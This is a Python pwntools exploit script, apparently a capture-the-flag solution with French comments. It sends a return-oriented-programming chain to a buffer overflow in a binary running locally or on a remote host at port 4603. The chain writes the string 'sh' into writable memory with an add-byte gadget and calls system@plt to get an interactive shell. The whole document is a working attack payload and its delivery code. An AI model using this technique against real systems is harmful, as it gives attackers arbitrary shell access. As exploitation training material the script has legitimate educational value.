#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=2)
context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./bin")

if args.GDB:
    p = gdb.debug(
        "./bin",
        """
    source /home/user/.gdbinit-gef.py
    break *(main+81)
    continue
    """,
    )
elif args.LOCAL:
    p = process("./bin")
else:
    p = remote("cytech.tcdn.casa", 4603)

# write-what-where gadget
#  0x0040113b               0001  add byte [rcx], al
#  0x0040113d                 5d  pop rbp
#  0x0040113e                 c3  ret
g_write = 0x0040113B

# pop rax, rbx, rcx
#  0x004011a3                 58  pop rax
#  0x004011a4                 5b  pop rbx
#  0x004011a5                 59  pop rcx
#  0x004011a6                 c3  ret
g_pop_rax_rbx_rcx = 0x004011A3

# pop rdi; ret
#  0x00401253                 5f  pop rdi
#  0x00401254                 c3  ret
g_pop_rdi = 0x00401253

# on utilise vmmap sur gef, on trouve l'addresse 0x0000000000404000 en RW
# on va s'en servir d'adresse ou ecrire 'sh'. tous les bytes sont deja null,
# donc pas besoin d'ecrire le dernier \0.
str_sh = 0x0000000000404000

UNUSED = -1  # pour combler les trous

payload = flat(
    {
        # ROP CHAIN:
        0x18: [
            # on ecrit 's' sur str_sh
            [
                g_pop_rax_rbx_rcx,
                [
                    p64(ord("s")),  # pop rax
                    UNUSED,  # pop rbx
                    str_sh,  # pop rcx
                ],
                g_write,
                [
                    UNUSED,  # pop rbp
                ],
            ],
            # on ecrit 'h' sur str_sh+1
            [
                g_pop_rax_rbx_rcx,
                [
                    p64(ord("h")),  # pop rax
                    UNUSED,  # pop rbx
                    str_sh + 1,  # pop rcx
                ],
                g_write,
                [
                    UNUSED,  # pop rbp
                ],
            ],
            # on met str_sh dans rdi (1er argument)
            g_pop_rdi,
            str_sh,
            # on execute system@plt
            exe.plt.system,
        ],
    }
)
log.hexdump(payload)
log.info(f"payload len = {len(payload)}")
p.sendlineafter(b"Name: ", payload)
p.interactive()
